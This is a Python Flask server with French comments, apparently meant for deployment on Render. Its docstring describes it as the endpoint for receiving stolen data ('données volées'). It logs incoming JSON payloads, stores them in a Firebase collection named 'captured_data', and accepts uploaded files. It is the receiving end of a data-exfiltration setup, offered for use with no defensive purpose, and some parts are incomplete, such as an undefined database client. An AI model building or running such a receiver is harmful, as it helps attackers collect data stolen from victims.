from flask import Flask, request, jsonify
import json
import os
# Importez ici les librairies nécessaires pour interagir avec Firebase
# Exemple : from firebase_admin import firestore 

app = Flask(__name__)

# --- CONFIGURATION FIREBASE (À ADAPTER) ---
# Vous devez remplacer ceci par votre logique de connexion Firebase réelle
FIREBASE_CONFIG = {
    "apiKey": "VOTRE_API_KEY_ICI",
    "projectId": "VOTRE_PROJECT_ID_ICI"
}
# --------------------------------------------

# Initialisation du client Firebase (si vous utilisez Firestore)
# try:
#     db = firestore.client(FIREBASE_CONFIG)
# except Exception as e:
#     print(f"Erreur d'initialisation Firebase: {e}")
#     db = None

@app.route('/', methods=['GET'])
def home():
    """Endpoint de vérification pour s'assurer que le serveur fonctionne."""
    return jsonify({"status": "Server is running", "message": "Ready to receive data."}), 200

@app.route('/receive_data', methods=['POST'])
def receive_data():
    """
    Endpoint principal pour recevoir les données volées (payload JSON).
    """
    if not request.is_json:
        return jsonify({"error": "Missing JSON in request"}), 400

    data = request.get_json()

    print(f"--- Données Reçues ---")
    # Ici, vous pouvez loguer les données directement ou les traiter
    print(f"Payload brut: {data}")

    # --- LOGIQUE DE STOCKAGE (FIREBASE) ---
    try:
        if db:
            # Exemple : Stocker les données dans une collection 'captured_data'
            doc_ref = db.collection('captured_data').add(data)
            print(f"Données stockées avec succès dans Firebase, ID: {doc_ref[1].id}")
            return jsonify({"status": "success", "message": "Data received and logged to Firebase"}), 201
        else:
            # Fallback si Firebase n'est pas connecté
            print("Firebase n'est pas connecté, enregistrement local temporaire.")
            return jsonify({"status": "success_fallback", "message": "Data received, Firebase offline"}), 200
    except Exception as e:
        print(f"Erreur lors du stockage dans Firebase: {e}")
        return jsonify({"status": "error", "message": f"Data received but failed to store: {str(e)}"}), 500

# Si vous gérez des fichiers (plus complexe, nécessite des librairies supplémentaires)
@app.route('/upload_file', methods=['POST'])
def upload_file():
    """Endpoint pour recevoir un fichier directement."""
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Logique pour sauvegarder le fichier localement ou UPLOADER vers Firebase Storage
    file_location = f"uploads/{file.filename}" # Sera géré par Render

    # --- Logique Firebase Storage serait mise ici ---

    return jsonify({"status": "success", "message": f"File '{file.filename}' received."}), 201


if __name__ == '__main__':
    # Pour le test local avant de déployer sur Render
    app.run(debug=True, host='0.0.0.0', port=5000)
